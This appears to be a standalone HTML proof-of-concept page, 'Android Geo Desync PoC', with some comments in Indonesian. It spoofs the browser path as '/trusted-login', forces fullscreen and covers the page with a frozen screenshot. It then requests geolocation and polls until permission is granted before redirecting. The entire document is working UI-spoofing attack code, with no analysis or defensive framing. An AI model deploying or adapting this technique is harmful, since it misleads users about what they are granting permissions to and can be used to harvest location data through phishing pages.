<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Desync PoC</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>
<body>

<button id="start">Start Demos</button>

<script>
const TARGET = "https://google.com";
let waitingForReturn = false;

// Freeze UI overlay
function freezeUI() {
  return html2canvas(document.body, {scale:2, useCORS:true}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL("image/png");
    Object.assign(img.style, {
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });
    document.body.innerHTML="";
    document.body.appendChild(img);
  });
}

// Request Geolocation
function requestGeo() {
  waitingForReturn = true;
  navigator.geolocation.getCurrentPosition(
    () => location.replace(TARGET),
    () => {} // user denied
  );
}

// Check permission state
function tryRedirect() {
  if (!navigator.permissions) return;
  navigator.permissions.query({name:'geolocation'}).then(res=>{
    if(res.state === "granted"){
      location.replace(TARGET);
    }
  });
}

// Polling untuk deteksi balik dari Settings
function startPolling() {
  let tries = 0;
  const interval = setInterval(()=>{
    tryRedirect();
    tries++;
    if(tries>20) clearInterval(interval); // ~10 detik
  },500);
}

// Event ketika user balik dari Settings
document.addEventListener("visibilitychange", ()=>{
  if(document.visibilityState==="visible" && waitingForReturn){
    startPolling();
  }
});
window.addEventListener("focus", ()=>{ if(waitingForReturn) startPolling(); });
window.addEventListener("pageshow", ()=>{ if(waitingForReturn) startPolling(); });

// Start PoC
document.getElementById("start").onclick = ()=>{
  // fullscreen
  if(document.documentElement.requestFullscreen){
    document.documentElement.requestFullscreen();
  }

  // spoof path
  history.replaceState({}, '', '/trusted-login');

  // freeze UI
  freezeUI().then(()=>{
    setTimeout(()=>{ requestGeo(); },100);
  });
};
</script>

</body>
</html>
